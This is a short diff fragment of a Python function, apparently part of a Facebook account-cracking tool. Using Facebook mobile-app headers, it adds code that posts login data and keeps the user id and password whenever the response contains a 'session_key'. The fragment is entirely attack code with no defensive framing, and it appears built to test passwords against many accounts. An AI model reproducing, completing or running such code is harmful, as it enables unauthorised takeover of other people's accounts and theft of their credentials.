@@ -210,3 +210,7 @@ def firex(ids,names,pasx,tl):
                     "X-FB-Connection-Type": "MOBILE.LTE",
                     "Content-Type": "application/x-www-form-urlencoded",
                     "Content-Length": "795"}
+                    po = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
+                    if 'session_key' in po:
+                        uid = str(ids)
+                        pas = str(pas)
